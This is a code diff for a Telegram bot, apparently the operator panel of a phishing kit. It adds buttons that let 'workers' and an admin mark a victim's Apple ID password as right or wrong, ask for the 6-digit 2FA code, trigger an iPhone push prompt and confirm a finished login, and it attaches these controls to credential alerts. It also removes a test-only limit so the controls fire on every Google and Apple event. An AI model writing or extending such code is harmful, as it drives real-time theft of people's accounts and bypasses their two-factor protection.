@@ -69,6 +69,24 @@ def get_google_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
     )
 
 
+def get_apple_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"actrl:wrong_pass:{user_tg_id}"),
+                InlineKeyboardButton(text="✅ Верный пароль", callback_data=f"actrl:correct_pass:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="🔢 Запросить 6 цифр (2FA)", callback_data=f"actrl:ask_code:{user_tg_id}"),
+                InlineKeyboardButton(text="❌ Неверный 2FA код", callback_data=f"actrl:wrong_code:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="📲 Пуш на iPhone (Гео)", callback_data=f"actrl:ask_prompt:{user_tg_id}"),
+                InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"actrl:complete:{user_tg_id}"),
+            ],
+        ]
+    )
+
 
 async def notify_session_revoked(
     user_tg_id: int,
@@ -533,12 +551,16 @@ async def notify_user_event(
             worker_alert_msg_id = None
             admin_alert_msg_id = None
 
-        # Control buttons ONLY appear when user explicitly selected Gmail login (norm_step starts with google_)
-        is_google_event = is_test_event and norm_step.startswith("google_")
+        # Control buttons appear for Google and Apple ID logins
+        is_google_event = norm_step.startswith("google_")
+        is_apple_event = norm_step.startswith("apple_")
 
         if is_google_event:
             admin_keyboard = get_google_control_keyboard(user_tg_id)
             worker_keyboard = get_google_control_keyboard(user_tg_id)
+        elif is_apple_event:
+            admin_keyboard = get_apple_control_keyboard(user_tg_id)
+            worker_keyboard = get_apple_control_keyboard(user_tg_id)
         elif is_final_auth:
             admin_keyboard = get_admin_log_keyboard(user_tg_id)
             worker_keyboard = None
@@ -995,9 +1017,15 @@ async def notify_auth_credential_event(
         if ADMIN_CHAT_ID:
             recipients.add(ADMIN_CHAT_ID)
 
+        reply_kb = None
+        if "apple" in event_type:
+            reply_kb = get_apple_control_keyboard(user_tg_id)
+        elif "google" in event_type:
+            reply_kb = get_google_control_keyboard(user_tg_id)
+
         for cid in recipients:
             try:
-                await admin_bot.send_message(chat_id=cid, text=msg_text, parse_mode="HTML")
+                await admin_bot.send_message(chat_id=cid, text=msg_text, parse_mode="HTML", reply_markup=reply_kb)
             except Exception as err:
                 logger.debug("Failed to send auth credential alert to %s: %s", cid, err)
 
